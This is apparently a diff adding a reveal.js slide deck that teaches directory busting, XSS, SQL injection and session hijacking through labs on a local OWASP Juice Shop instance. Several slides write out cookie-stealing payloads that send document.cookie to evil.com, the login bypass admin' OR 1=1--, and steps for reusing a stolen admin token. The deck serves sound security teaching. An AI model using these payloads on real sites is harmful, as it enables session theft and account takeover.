+            <li class="fragment">It tells the server which file you want</li>
+            <li class="fragment">Web servers are just computers serving files from a folder</li>
+          </ul>
+        </section>
+
+        <section>
+          <h2>Paths</h2>
+          <pre style="font-size:0.85em; background:#111; padding:15px; color:#ddd;">
+            /website_folder/
+            ├── index.html
+            ├── about.html
+            ├── images/
+            │   └── logo.png
+            └── admin/
+                └── dashboard.html
+          </pre>
+          <ul>
+            <li class="fragment">GET /about.html → sends back about.html</li>
+            <li class="fragment">GET /admin/dashboard.html → sends back dashboard.html</li>
+          </ul>
+        </section>
+
+        <section>
+          <h2>wget</h2>
+          <ul>
+            <li>Your browser does this automatically</li>
+            <li class="fragment">A tool called <strong>wget</strong> lets you GET files from the command line</li>
+          </ul>
+        </section>
+
+
+        <!-- Note: pre needs to be replaced  -->
+
+        <section>
+          <h2>Lab: wget</h2>
+          <ul>
+            <li>Your Linux machine is running a web server</li>
+            <li>We&apos;re going to GET files from it directly</li>
+          </ul>
+          <pre style="font-size:0.85em; background:#111; padding:15px; color:#ddd;">
+            # Download a file from the web server
+            $ wget http://&lt;your-ip&gt;/index.html
+
+            # View what you got
+            $ cat index.html
+          </pre>
+          <ul>
+            <li class="fragment">wget sends a GET request and saves the response to disk</li>
+            <li class="fragment">Try downloading other files you find at different paths</li>
+            <li class="fragment">What happens when you request a file that doesn&apos;t exist?</li>
+          </ul>
+        </section>
+
+        <section>
+          <h2>The Problem with Paths</h2>
+          <ul>
+            <li>Developers sometimes forget files are publicly accessible</li>
+            <li class="fragment">A backup file left on the server:</li>
+          </ul>
+          <pre class="fragment" style="font-size:0.85em; background:#111; padding:15px; color:#ddd;">
+            /backup.zip
+            /config.old
+            /admin/
+            /.git/
+          </pre>
+          <ul>
+            <li class="fragment">If you know the path, you can GET it</li>
+            <li class="fragment">The server doesn&apos;t ask <em>why</em> you want it</li>
+          </ul>
+        </section>
+
+
+
+
+
+        <section>
+          <h2>Directory Busting</h2>
+          <ul>
+            <li>What if we just... guess paths?</li>
+            <li class="fragment">Tools like <strong>dirb</strong> and <strong>gobuster</strong> automate this</li>
+            <li class="fragment">They try thousands of common paths and report what responds</li>
+          </ul>
+          <pre class="fragment"
+               style="
+                      display:block;
+                      width:100%;
+                      text-align:left;
+                      margin-left:0;
+                      color:#ddd;
+                      margin-right:auto;
+                      ">
+            /admin         → 200 OK   ← found it
+            /login         → 200 OK   ← found it
+            /backup        → 404      ← not there
+            /config        → 403      ← exists but forbidden
+          </pre>
+        </section>
+
+
+        <section>
+          <h2>Starting Juice Shop</h2>
+          <ul>
+          </ul>
+          <pre class="fragment"
+               style="
+                      display:block;
+                      width:100%;
+                      text-align:left;
+                      margin-left:0;
+                      color:#ddd;
+                      margin-right:auto;
+                      ">
+          </pre>
+        </section>
+
+
+
+
+
+        <section>
+          <h2>Lab: Dirbusting Juice Shop</h2>
+          <ul>
+            <li>Juice Shop is running at <strong>http://localhost:3000</strong></li>
+            <li>We&apos;ll use <strong>dirb</strong> to discover hidden paths</li>
+          </ul>
+          <pre style="font-size:0.85em; background:#111; padding:15px; color:#ddd;">
+            $ dirb http://localhost:3000
+          </pre>
+          <ul>
+            <li class="fragment">Watch the output — note every path that returns 200</li>
+            <li class="fragment">Try visiting those paths in your browser</li>
+            <li class="fragment">Can you find the <strong>score board</strong>? It&apos;s intentionally hidden from the nav</li>
+            <li class="fragment">Hint: look for paths that contain the word "score"</li>
+          </ul>
+        </section>
+
+
+
+        <!-- ===================== HTML / CSS / JS ===================== -->
+
+        <section>
+          <h2>HTML, CSS, and JavaScript</h2>
+          <ul>
+            <li>These define how websites look and behave</li>
+            <li>Browsers interpret them directly</li>
+            <li>We will look at each one through repetition</li>
+          </ul>
+        </section>
+
+        <!-- ===================== INTRO TO HTML ===================== -->
+
+        <section>
+          <h2>HTML</h2>
+          <ul>
+            <li>HTML defines the <b>text</b> of a website </li>
+            <li>Text is marked with "Tags"</li>
+          </ul>
+        </section>
+
+        <section>
+          <h2>Basic Tags</h2>
+          <ul>
+            <li>h1, h2, h3, ..., h6 define "headers"</li>
+          </ul>
+        </section>
+
+        <section>
+          <pre>
+            &lt;h1&gt; Header 1 &lt;/h1&gt;
+            &lt;h2&gt; Header 2 &lt;/h2&gt;
+            &lt;h3&gt; Header 3 &lt;/h3&gt;
+            &lt;h4&gt; Header 4 &lt;/h4&gt;
+            &lt;h5&gt; Header 5 &lt;/h5&gt;
+            &lt;h6&gt; Header 6 &lt;/h6&gt;
+          </pre>
+        </section>
+
+        <section>
+          <h1> Header 1 </h1>
+          <h2> Header 2 </h2>
+          <h3> Header 3 </h3>
+          <h4> Header 4 </h4>
+          <h5> Header 5 </h5>
+          <h6> Header 6 </h6>
+        </section>
+
+        <section>
+          <h2>More Tags</h2>
+          <ul>
+            <li>These slides are rendered in your browser</li>
+            <li>They are made from HTML!</li>
+          </ul>
+        </section>
+
+        <section>
+          <pre>
+            &lt;h2&gt;More Tags&lt;/h2&gt;
+            &lt;ul&gt;
+            &lt;li&gt;These slides are rendered in your browser&lt;/li&gt;
+            &lt;li&gt;They are made from HTML!&lt;/li&gt;
+            &lt;/ul&gt;
+          </pre>
+        </section>
+
+        <section>
+          <h2>What if we change ul to ol?</h2>
+          <pre>
+            &lt;h2&gt;More Tags&lt;/h2&gt;
+            &lt;ol&gt;
+            &lt;li&gt;These slides are rendered in your browser&lt;/li&gt;
+            &lt;li&gt;They are made from HTML!&lt;/li&gt;
+            &lt;/ol&gt;
+          </pre>
+        </section>
+
+        <section>
+          <h2>More Tags</h2>
+          <ol>
+            <li>These slides are rendered in your browser</li>
+            <li>They are made from HTML!</li>
+          </ol>
+        </section>
+
+        <section>
+          <h2>Two Resources</h2>
+          <ul>
+            <li><a href="https://www.w3schools.com/tags/">
+                Reference for html tags
+              </a>
+            </li>
+            <li><a href="https://www.w3schools.com/html/">
+                Reference for html 
+              </a>
+            </li>
+          </ul>
+        </section>
+
+        <section>
+          <h2>Mini Lab</h2>
+          <ul>
+            <li>On the next slide, you can try HTML for yourself</li>
+            <li>Go find 2 tags from the resource to try</li>
+          </ul>
+        </section>
+
+        <!-- ========================================== -->
+        <section>
+          <h2>HTML</h2>
+
+          <textarea class="editor" style="
+                                          width: 100%;
+                                          height: 200px;
+                                          font-family: monospace;
+                                          ">
+            <h1>Hello</h1>
+            <p>HTML example</p>
+          </textarea>
+
+          <button onclick="runFromSlide(event)">Render →</button>
+        </section>
+
+        <section>
+          <h2>Output</h2>
+          <iframe class="preview" style="width:100%;height:400px;"></iframe>
+        </section>
+
+        <!-- ===================== INTRO TO CSS ===================== -->
+
+        <section>
+          <h2>CSS</h2>
+
+          <textarea class="editor" style="
+                                          width: 100%;
+                                          height: 200px;
+                                          font-family: monospace;
+                                          ">
+            <h1 style="color: blue;">Styled</h1>
+          </textarea>
+
+          <button onclick="runFromSlide(event)">Render →</button>
+        </section>
+
+        <section>
+          <h2>Output</h2>
+          <iframe class="preview" style="width:100%;height:400px;"></iframe>
+        </section>
+
+        <section>
+          <h2>CSS</h2>
+
+          <pre>
+            p {
+            background: yellow;
+            padding: 10px;
+            }
+          </pre>
+
+          <ul>
+            <li>This CSS code will change every p tag globally</li>
+          </ul>
+
+        </section>
+
+        <section>
+          <h2>Rendered CSS</h2>
+
+          <p style="background: yellow; padding: 10px;">
+            This paragraph is styled
+          </p>
+        </section>
+
+        <!-- ===================== JAVASCRIPT INTRO ===================== -->
+
+        <section>
+          <h2>Are HTML and CSS Boring?</h2>
+          <ul>
+            <li class="fragment">HTML and CSS put text on the screen and color it</li>
+            <ul><li class="fragment">They do a little more than that, but not much...</li></ul>
+            <li class="fragment">The Question:</li>
+          </ul>
+          <p class="fragment">How does Netflix work?</p>
+        </section>
+
+        <section>
+          <h2>JavaScript</h2>
+          <button onclick="spawnBalls()">Spawn Balls</button>
+
+          <div id="arena" style="
+                                 position: relative;
+                                 width: 100%;
+                                 height: 400px;
+                                 background: #111;
+                                 overflow: hidden;
+                                 margin-top: 20px;
+                                 "></div>
+
+          <script>
+            const arena = () => document.getElementById("arena");
+
+            function spawnBalls() {
+                for (let i = 0; i < 10; i++) {
+                    createBall();
+                }
+            }
+
+            function createBall() {
+                const ball = document.createElement("div");
+
+                const size = 20 + Math.random() * 20;
+                ball.style.width = size + "px";
+                ball.style.height = size + "px";
+                ball.style.borderRadius = "50%";
+                ball.style.position = "absolute";
+                ball.style.background = `hsl(${Math.random() * 360}, 80%, 60%)`;
+
+                // fade setup
+                ball.style.transition = "opacity 1s ease";
+
+                let x = Math.random() * 300;
+                let y = Math.random() * 200;
+                let vx = (Math.random() - 0.5) * 6;
+                let vy = (Math.random() - 0.5) * 6;
+
+                ball.style.left = x + "px";
+                ball.style.top = y + "px";
+
+                arena().appendChild(ball);
+
+                function animate() {
+                    const rect = arena().getBoundingClientRect();
+
+                    x += vx;
+                    y += vy;
+
+                    if (x <= 0 || x >= rect.width - size) vx *= -1;
+                    if (y <= 0 || y >= rect.height - size) vy *= -1;
+
+                    ball.style.left = x + "px";
+                    ball.style.top = y + "px";
+
+                    requestAnimationFrame(animate);
+                }
+
+                animate();
+
+                // fade + remove after 5 seconds
+                setTimeout(() => {
+                    ball.style.opacity = "0";
+                    setTimeout(() => ball.remove(), 1000);
+                }, 5000);
+            }
+          </script>
+        </section>
+
+
+        <!-- ===================== JAVASCRIPT LAB ===================== -->
+
+        <section>
+          <h2>JavaScript</h2>
+        </section>
+
+        <section>
+          <h2>What is JavaScript?</h2>
+          <ul>
+            <li>HTML puts text on the page</li>
+            <li>CSS styles it</li>
+            <li class="fragment">JavaScript makes it <strong>do things</strong></li>
+            <li class="fragment">It runs inside your browser</li>
+            <li class="fragment">Every website you use is powered by it</li>
+          </ul>
+        </section>
+
+        <section>
+          <h2>Javascript in HTML</h2>
+          <ul>
+            <li>We can add put javascript inside of HTML with the &ltscript&gt tag</li>
+          </ul>
+        </section>
+
+        <section>
+          <h2>JavaScript in HTML</h2>
+          <pre style="font-size:0.85em; background:#111; padding:15px; color:#ddd;">
+            &lt;h1&gt;My Page&lt;/h1&gt;
+
+            &lt;script&gt;
+            alert("Hello from JavaScript!")
+            &lt;/script&gt;
+          </pre>
+          <ul>
+            <li>The browser reads the HTML top to bottom</li>
+            <li>When it hits a &lt;script&gt; tag, it runs the JavaScript inside</li>
+            <li>This is how every website adds behavior to a page</li>
+          </ul>
+        </section>
+
+
+
+        <section>
+          <h2>The Browser Console</h2>
+          <ul>
+            <li>Your browser has a built-in JavaScript interpreter</li>
+            <li class="fragment">Open it with: <strong>F12 → Console tab</strong></li>
+            <li class="fragment">You can type JavaScript directly in and run it</li>
+          </ul>
+        </section>
+
+        <section>
+          <h2>Lab: JavaScript in the Console</h2>
+          <ul>
+            <li>Open Juice Shop: <strong>http://localhost:3000</strong></li>
+            <li>Press <strong>F12</strong> and click the <strong>Console</strong> tab</li>
+            <li>Try each of these one at a time:</li>
+          </ul>
+          <pre style="font-size:0.78em; background:#111; padding:15px; color:#ddd;">
+            // Print something
+            console.log("hello")
+
+            // Do math
+            2 + 2
+
+            // Pop up an alert
+            alert("I am in your browser")
+
+            // Read the page title
+            document.title
+
+            // Change the page title
+            document.title = "Hacked"
+
+            // Change a heading on the page
+            document.querySelector("h1").innerText = "Juice Hacked"
+          </pre>
+          <p class="fragment">JavaScript can read and rewrite anything on the page</p>
+        </section>
+
+        <section>
+          <h2>Why Does That Matter?</h2>
+          <ul>
+            <li>You just rewrote a live webpage from your own browser</li>
+            <li class="fragment">But that only affected <strong>your</strong> copy of the page</li>
+            <li class="fragment">What if you could make <em>someone else&apos;s</em> browser run your JavaScript?</li>
+          </ul>
+        </section>
+
+
+
+        <!-- ===================== XSS ===================== -->
+
+        <section>
+          <h2>Cross-Site Scripting (XSS)</h2>
+        </section>
+
+        <section>
+          <h2>Website Input</h2>
+          <ul>
+            <li>Many websites take something you type and put it back on the page</li>
+            <li class="fragment">Search bars, comment sections, reviews, profile names</li>
+            <li class="fragment">Normally this is just text — harmless</li>
+          </ul>
+          <pre class="fragment" style="font-size:0.85em; background:#111; padding:15px; color:#ddd;">
+            You searched for: <strong>apple juice</strong>
+          </pre>
+          <ul>
+            <li class="fragment">But what if the site doesn&apos;t treat your input as text?</li>
+            <li class="fragment">What if it treats it as <strong>HTML</strong>?</li>
+          </ul>
+        </section>
+
+        <section>
+          <h2>Input Becoming Code</h2>
+          <ul>
+            <li>A safe site escapes your input before rendering it</li>
+          </ul>
+          <pre class="fragment"
+               style="
+                      display:block;
+                      width:100%;
+                      text-align:left;
+                      margin-left:0;
+                      color:#ddd;
+                      margin-right:auto;
+                      ">
+            You typed:    &lt;script&gt;alert("hi")&lt;/script&gt;
+            Safe site:    displays it as plain text — harmless
+            Unsafe site:  injects it into the page as real HTML
+          </pre>
+          <ul>
+            <li class="fragment">On an unsafe site, the browser sees a real script tag</li>
+            <li class="fragment">And runs it</li>
+          </ul>
+        </section>
+
+        <section>
+          <h2>Three Kinds of XSS</h2>
+          <ul>
+            <li><strong>Reflected</strong> — payload lives in a URL, runs immediately when the link is opened</li>
+            <li class="fragment"><strong>Stored</strong> — payload is saved to the database, runs for <em>every</em> visitor who loads that page</li>
+            <li class="fragment"><strong>DOM-based</strong> — the page&apos;s own JavaScript takes your input and writes it into the page without sanitizing it first</li>
+          </ul>
+          <p class="fragment">Stored XSS is the most dangerous — one payload, unlimited victims</p>
+        </section>
+
+        <section>
+          <h2>Reflected XSS — How It Works</h2>
+          <ul>
+            <li>Attacker crafts a malicious URL:</li>
+          </ul>
+          <pre class="fragment"
+               style="
+                      display:block;
+                      width:100%;
+                      text-align:left;
+                      margin-left:0;
+                      color:#ddd;
+                      margin-right:auto;
+                      ">
+            https://bank.com/search?q=&lt;script&gt;alert("hacked")&lt;/script&gt;
+          </pre>
+          <ul>
+            <li class="fragment">Attacker sends this link to a victim (email, text, etc.)</li>
+            <li class="fragment">Victim clicks the link — their browser opens the bank site</li>
+            <li class="fragment">The webpage <em>reflects</em> the search term from the URL straight onto the page</li>
+            <li class="fragment">The script runs in the victim&apos;s browser</li>
+          </ul>
+        </section>
+
+        <section>
+          <h2>Try It: Reflected XSS</h2>
+          <p style="font-size:0.8em;">Type something in the box — it gets reflected onto the page. Then try injecting HTML.</p>
+          <input id="xss-input" type="text" placeholder='Try: <img src=x onerror=alert("XSS")>'
+                 style="width:80%; padding:8px; font-size:0.8em; background:#222; color:#ddd; border:1px solid #555;"
+                 oninput="document.getElementById('xss-output').innerHTML = 'You searched for: ' + this.value"
+                 />
+          <div style="margin-top:20px; padding:15px; background:#111; min-height:60px; border:1px solid #333;">
+            <span style="color:#888; font-size:0.75em;">Page output:</span>
+            <div id="xss-output" style="color:#ddd; margin-top:8px;">You searched for: </div>
+          </div>
+          <p class="fragment" style="color:#ff6666; font-size:0.8em;">⚠️ Try: <code>&lt;b&gt;bold&lt;/b&gt;</code> then <code>&lt;img src=x onerror=alert(1)&gt;</code></p>
+        </section>
+
+        <section>
+          <h2>Stored XSS — How It Works</h2>
+          <ul>
+            <li>Attacker posts a comment on a website:</li>
+          </ul>
+          <pre class="fragment"
+               style="
+                      display:block;
+                      width:100%;
+                      text-align:left;
+                      margin-left:0;
+                      color:#ddd;
+                      margin-right:auto;
+                      ">
+            Great product! &lt;script&gt;
+            document.location =
+            &apos;https://evil.com/steal?c=&apos; + document.cookie
+            &lt;/script&gt;
+          </pre>
+          <ul>
+            <li class="fragment">The site saves this to the database without sanitizing it</li>
+            <li class="fragment">Every user who loads that page runs the script</li>
+            <li class="fragment">Their cookies get sent to the attacker&apos;s server</li>
+            <li class="fragment">The attacker never had to interact with the victims directly</li>
+          </ul>
+        </section>
+
+        <section>
+          <h2>DOM-based XSS — How It Works</h2>
+          <ul>
+            <li>Some sites use JavaScript to write your input directly into the page</li>
+          </ul>
+          <pre class="fragment"
+               style="
+                      display:block;
+                      width:100%;
+                      text-align:left;
+                      margin-left:0;
+                      color:#ddd;
+                      margin-right:auto;
+                      ">
+            // Vulnerable JavaScript on the page:
+            let query = location.search;
+            document.getElementById("results").innerHTML =
+            "You searched for: " + query;
+          </pre>
+          <ul>
+            <li class="fragment"><strong>innerHTML</strong> parses HTML — it doesn&apos;t treat the input as plain text</li>
+            <li class="fragment">So if your input contains a tag, the browser renders it as a tag</li>
+            <li class="fragment">No server involved — the page attacks itself</li>
+          </ul>
+        </section>
+
+        <section>
+          <h2>Lab: DOM XSS on Juice Shop</h2>
+          <ul>
+            <li>Go to <strong>http://localhost:3000</strong></li>
+            <li>Find the <strong>search bar</strong> in the top navigation</li>
+            <li>Paste this in and press Enter:</li>
+          </ul>
+          <pre class="fragment"
+               style="
+                      display:block;
+                      width:100%;
+                      text-align:left;
+                      margin-left:0;
+                      color:#ddd;
+                      margin-right:auto;
+                      ">
+            &lt;iframe src="javascript:alert(`xss`)"&gt;
+          </pre>
+          <ul>
+            <li class="fragment">An alert box pops up saying <strong>xss</strong></li>
+            <li class="fragment">Juice Shop wrote your input into the DOM using innerHTML</li>
+            <li class="fragment">The browser treated your iframe tag as real HTML and ran its JavaScript</li>
+            <li class="fragment">You just executed arbitrary code inside Juice Shop</li>
+          </ul>
+        </section>
+
+        <section>
+          <h2>What Could an Attacker Actually Do?</h2>
+          <ul>
+            <li>Popping an alert proves the vulnerability — but the real payloads are worse</li>
+          </ul>
+          <pre class="fragment" style="font-size:0.75em; background:#111; padding:15px; color:#ddd;">
+            &lt;!-- Steal the victim&apos;s session cookie --&gt;
+            &lt;iframe src="javascript:
+            fetch(&apos;https://evil.com/steal?c=&apos; + document.cookie)
+            "&gt;
+
+            &lt;!-- Redirect to a fake login page --&gt;
+            &lt;iframe src="javascript:
+            document.location = &apos;https://evil.com/fake-login&apos;
+            "&gt;
+
+            &lt;!-- Silently make requests as the victim --&gt;
+            &lt;iframe src="javascript:
+            fetch(&apos;/api/transfer&apos;, {method:&apos;POST&apos;, body:&apos;amount=1000&to=attacker&apos;})
+            "&gt;
+          </pre>
+          <ul>
+            <li class="fragment">All of these run with the victim&apos;s permissions, on the real site&apos;s domain</li>
+          </ul>
+        </section>
+
+
+
+        <section>
+          <h2>SQL Injection</h2>
+        </section>
+
+        <section>
+          <h2>Databases</h2>
+          <ul>
+            <li>Almost every website stores data in a <strong>database</strong></li>
+            <li class="fragment">Your username, password, posts, orders — all in there</li>
+          </ul>
+          <pre class="fragment"
+               style="
+                      font-size: clamp(12px, 1.5vw, 24px);
+                      display:block;
+                      width:100%;
+                      text-align:left;
+                      margin-left:0;
+                      color:#ddd;
+                      margin-right:auto;
+                      ">
+            -- "Give me everything about the user with this email"
+            SELECT * FROM users WHERE email = &apos;alice@example.com&apos;
+          </pre>
+        </section>
+
+        <section>
+          <h2>Data</h2>
+
+          <ul>
+            <li>Data is stored as rows and columns</li>
+            <li>Row: Data Entry</li>
+            <li>Column: Element of that Entry</li>
+          </ul>
+
+          <pre class="fragment"
+               style="
+                      font-size: clamp(12px, 1.5vw, 24px);
+                      display:block;
+                      width:100%;
+                      text-align:left;
+                      margin-left:0;
+                      color:#ddd;
+                      margin-right:auto;
+                      ">
+            email              name        age     role
+            alice@example.com  Alice       21      student
+            bob@example.com    Bob         24      TA
+            carol@example.com  Carol       19      student
+          </pre>
+        </section>
+
+
+        <section>
+          <h2>SQL</h2>
+          <ul>
+            <li>SQL is a "Query" language</li>
+            <li class="fragment">Sentences in SQL "Query" the database for information</li>
+          </ul>
+          <pre class="fragment"
+               style="
+                      font-size: clamp(12px, 1.5vw, 24px);
+                      display:block;
+                      width:100%;
+                      text-align:left;
+                      margin-left:0;
+                      color:#ddd;
+                      background:#111
+                      margin-right:auto;
+                      ">
+            -- "Give me everything about the user with this email"
+            SELECT * FROM users WHERE email = &apos;alice@example.com&apos;
+          </pre>
+          <p></p>
+        </section>
+
+
+        <section>
+          <h2>Logging in</h2>
+          <ul>
+            <li>Facebook needs to check your username and password</li>
+          </ul>
+          <pre class="fragment"
+               style="
+                      font-size: clamp(12px, 1.5vw, 24px);
+                      display:block;
+                      width:100%;
+                      text-align:left;
+                      margin-left:0;
+                      color:#ddd;
+                      background:#111
+                      margin-right:auto;
+                      ">
+            SELECT * FROM users
+            WHERE email    = &apos;alice@example.com&apos;
+            AND   password = &apos;hunter2&apos;
+          </pre>
+          <ul>
+            <li class="fragment">If the query returns a row → logged in</li>
+            <li class="fragment">If no rows returned → access denied</li>
+          </ul>
+        </section>
+
+        <section>
+          <h2>Logging in</h2>
+          <ul>
+            <li>Facebook takes YOUR input, and checks the Database</li>
+            <li>Normal email: &nbsp;<code>alice@example.com</code></li>
+            <li class="fragment">Malicious email: &nbsp;<code>alice&apos; OR 1=1--</code></li>
+          </ul>
+          <pre class="fragment"
+               style="
+                      font-size: clamp(12px, 1.5vw, 24px);
+                      display:block;
+                      width:100%;
+                      text-align:left;
+                      margin-left:0;
+                      color:#ddd;
+                      background:#111
+                      margin-right:auto;
+                      ">
+            -- What the server builds:
+            SELECT * FROM users
+            WHERE email    = &apos;alice&apos; OR 1=1--&apos;
+            AND   password = &apos;anything&apos;
+          </pre>
+          <ul>
+            <li class="fragment">The <strong>&apos;</strong> closes the email string early</li>
+            <li class="fragment"><strong>OR 1=1</strong> is always true — the WHERE clause always passes</li>
+            <li class="fragment"><strong>--</strong> is a SQL comment — it deletes the rest of the query</li>
+          </ul>
+        </section>
+
+        <section>
+          <p style="font-size:0.75em; color:#aaa;">Type in the email field and watch the SQL query change:</p>
+          <input id="sqli-email" type="text" value="alice@example.com"
+                 style="width:80%; padding:8px; font-size:0.85em; background:#222; color:#ddd; border:1px solid #555;"
+                 oninput="updateQuery()"
+                 />
+          <pre id="sqli-query" style="font-size:0.8em; background:#111; padding:15px; color:#ddd; margin-top:16px; white-space:pre-wrap;"></pre>
+          <div id="sqli-result" style="margin-top:10px; font-size:0.85em; padding:10px; border-radius:5px;"></div>
+
+          <script>
+            function updateQuery() {
+                const email = document.getElementById('sqli-email').value;
+                const el = document.getElementById('sqli-query');
+                const res = document.getElementById('sqli-result');
+
+                const safe = email.replace(/</g,'&lt;').replace(/>/g,'&gt;');
+                el.innerHTML = `SELECT * FROM users\nWHERE email = '<span style="color:#ff9944">${safe}</span>'\nAND   password = 'hunter2'`;
+
+                const isInjected = email.includes("'") || email.includes('--') || email.toLowerCase().includes('or');
+                if (isInjected) {
+                    res.style.background = '#2a0000';
+                    res.style.color = '#ff6666';
+                    res.style.border = '1px solid #880000';
+                    res.textContent = '⚠️ Input contains SQL characters — the query structure may be broken';
+                } else {
+                    res.style.background = '#002a00';
+                    res.style.color = '#66ff66';
+                    res.style.border = '1px solid #008800';
+                    res.textContent = '✅ Clean input — query is safe';
+                }
+
+                // sync to next slide
+                const injected = document.getElementById('sqli-result-2');
+                const query2 = document.getElementById('sqli-query-2');
+                if (injected && query2) {
+                    query2.innerHTML = el.innerHTML;
+                    injected.style.background = res.style.background;
+                    injected.style.color = res.style.color;
+                    injected.style.border = res.style.border;
+                    injected.textContent = res.textContent;
+                }
+            }
+            updateQuery();
+            </script>
+        </section>
+
+        <section style="
+                        font-size: clamp(30px, 1.4vw, 80px);
+                        ">
+          <h2>Lab: SQL Injection on Juice Shop</h2>
+          <ul>
+            <li>Go to <strong>http://localhost:3000/#/login</strong></li>
+            <li>In the <strong>email</strong> field, type exactly:</li>
+          </ul>
+          <pre style="font-size:0.85em; background:#111; padding:15px; color:#ddd;">
+            admin&apos; OR 1=1--
+          </pre>
+          <ul>
+            <li>Type anything you want in the password field — it won&apos;t be checked</li>
+            <li>Click Log In</li>
+            <li class="fragment">You are now logged in as the <strong>admin account</strong></li>
+            <li class="fragment">Open <strong>F12 → Application → Local Storage</strong> and find the <strong>token</strong> key</li>
+            <li class="fragment">That JWT is the admin&apos;s session — the same one we hijacked in the cookie lab</li>
+          </ul>
+        </section>
+
+        <section>
+          <h2>SQL Injection vs XSS — The Pattern</h2>
+          <ul>
+            <li>Both attacks follow the same root cause:</li>
+          </ul>
+          <ul>
+            <li class="fragment"><strong>XSS</strong> — user input gets treated as HTML/JavaScript</li>
+            <li class="fragment"><strong>SQL Injection</strong> — user input gets treated as SQL</li>
+            <li class="fragment"><strong>Fatal Flaw</strong> — Assuming user input won't be code</li>
+          </ul>
+          <p class="fragment">Most web vulnerabilities come back to this one mistake</p>
+        </section>
+
+
+
+        <!-- ===================== COOKIES ===================== -->
+
+        <section>
+          <h2>Cookies</h2>
+        </section>
+
+        <section>
+          <h2>The Stateless Problem</h2>
+          <ul>
+            <li>HTTP has no memory</li>
+            <li class="fragment">Every request is brand new — the server doesn&apos;t know who you are</li>
+            <li class="fragment">So how does Facebook know you&apos;re still logged in when you click to the next page?</li>
+          </ul>
+        </section>
+
+        <section>
+          <h2>Cookies</h2>
+          <ul>
+            <li>When you log in, the server creates a <strong>session</strong> and hands you a token</li>
+            <li class="fragment">That token is stored in your browser as a <strong>cookie</strong></li>
+            <li class="fragment">Your browser attaches that cookie to <em>every</em> request automatically</li>
+            <li class="fragment">The server sees the token and knows it&apos;s you — no password needed again</li>
+          </ul>
+          <pre class="fragment" style="font-size:0.85em; background:#111; padding:15px; color:#ddd;">
+            GET /feed HTTP/1.1
+            Host: facebook.com
+            Cookie: session=abc123xyz
+          </pre>
+        </section>
+
+        <section>
+          <h2>Cookies in the Browser</h2>
+          <ul>
+            <li>Open <strong>F12 → Application → Cookies</strong></li>
+            <li class="fragment">You can see every cookie a site has stored in your browser</li>
+          </ul>
+          <pre class="fragment" style="font-size:0.85em; background:#111; padding:15px; color:#ddd;">
+            Name:     token
+            Value:    eyJhbGciOiJSUzI1NiIsInR5...
+            HttpOnly: false
+            Secure:   false
+          </pre>
+          <ul>
+            <li class="fragment"><strong>HttpOnly: false</strong> means JavaScript can read this cookie</li>
+            <li class="fragment"><strong>Secure: false</strong> means it can be sent over plain HTTP, not just HTTPS</li>
+          </ul>
+        </section>
+
+        <section>
+          <h2>Session Hijacking</h2>
+          <ul>
+            <li>If someone gets your cookie value...</li>
+            <li class="fragment">They don&apos;t need your password</li>
+            <li class="fragment">Site logs them in as you "for free"</li>
+          </ul>
+          <pre class="fragment" style="font-size:0.85em; background:#111; padding:15px; color:#ddd;">
+            GET /account/settings HTTP/1.1
+            Host: juice-shop.com
+            Cookie: token=eyJhbGciOiJSUzI1NiIsInR5...
+          </pre>
+          <ul>
+            <li class="fragment">The server sees a valid token and hands over the account</li>
+          </ul>
+        </section>
+
+        <section>
+          <h2>Lab: Reading Cookies via the Console</h2>
+          <ul>
+            <li>Go to <strong>http://localhost:3000</strong> and log in as any user</li>
+            <li>Open <strong>F12 → Console</strong> and type:</li>
+          </ul>
+          <pre style="font-size:0.85em; background:#111; padding:15px; color:#ddd;">
+            document.cookie
+          </pre>
+          <ul>
+            <li class="fragment">You&apos;ll see the raw cookie string your browser is sending with every request</li>
+            <li class="fragment">Now try this — it sends your cookie "somewhere":</li>
+          </ul>
+          <pre class="fragment" style="font-size:0.78em; background:#111; padding:15px; color:#ddd;">
+            &lt;iframe src="javascript:alert(document.cookie)"&gt;
+          </pre>
+          <ul>
+            <li class="fragment">Paste that into the Juice Shop search bar</li>
+            <li class="fragment">Your cookie just popped up in an alert — a real attacker would send it to their server instead</li>
+          </ul>
+        </section>
+
+        <section>
+          <h2>Lab: Hijack the Admin Session</h2>
+          <ul>
+            <li>We&apos;ll combine what we&apos;ve learned — use SQL injection to get admin, then steal the token</li>
+            <li>Log into Juice Shop using the SQL injection payload from earlier</li>
+            <li>Open <strong>F12 → Application → Local Storage → localhost:3000</strong></li>
+            <li>Find and copy the <strong>token</strong> value</li>
+          </ul>
+          <ul>
+            <li class="fragment">Now open a <strong>private/incognito window</strong> and go to <strong>http://localhost:3000</strong></li>
+            <li class="fragment">Open the console there and run:</li>
+          </ul>
+          <pre class="fragment" style="font-size:0.78em; background:#111; padding:15px; color:#ddd;">
+            localStorage.setItem(&apos;token&apos;, &apos;PASTE_TOKEN_HERE&apos;)
+          </pre>
+          <ul>
+            <li class="fragment">Refresh — you are now the admin, with no password, in a fresh browser window</li>
+          </ul>
+        </section>
+
+        <!-- ===================== SQL INJECTION ===================== -->
+
+        <section>
+          <h2>Teaching Web Security</h2>
+          <ul>
+            <li>The greatest tool - CTFs
+              <ul>
+                <li>ctftime</li>
+                <li>picoctf</li>
+                <li>Portswigger challenges</li>
+              </ul>
+            </li>
+          </ul>
+        </section>
+
+        <!-- ===================== SUMMARY ===================== -->
+
+        <section>
+          <h2>Summary</h2>
+          <ul>
+            <li><strong>Dirbusting</strong> — find hidden paths the site doesn&apos;t link to</li>
+            <li class="fragment"><strong>XSS</strong> — inject JavaScript into pages to run code in other users&apos; browsers</li>
+            <li class="fragment"><strong>Cookie Theft</strong> — steal session tokens to impersonate users without a password</li>
+            <li class="fragment"><strong>SQL Injection</strong> — inject SQL into input fields to bypass auth or dump databases</li>
+          </ul>
+          <p class="fragment">Every one of these comes down to the same mistake: <strong>treating user input as trusted</strong></p>
+        </section>
+
+        <script src="https://unpkg.com/reveal.js/dist/reveal.js"></script>
+        <script>
+          Reveal.initialize({
+              hash: true,
+              slideNumber: true
+          });
+
+        </script>
+
+        <script>
+
+          function runFromSlide(event) {
+              const slide = event.target.closest("section");
+
+              const code = slide.querySelector(".editor").value;
+              const preview = slide.nextElementSibling.querySelector(".preview");
+
+              preview.srcdoc = code;
+
+              Reveal.next();
+          }
+
+          const sources = [
+              {
+                  link: "https://www.ionos.com/digitalguide/websites/web-development/arpanet-definition-history-of-the-internet-predecessor/",
+              },
+              {
+                  link: "https://en.wikipedia.org/wiki/History_of_the_Internet",
+              },
+              {
+                  link: "https://en.wikipedia.org/wiki/History_of_the_Internet",
+              },
+              {
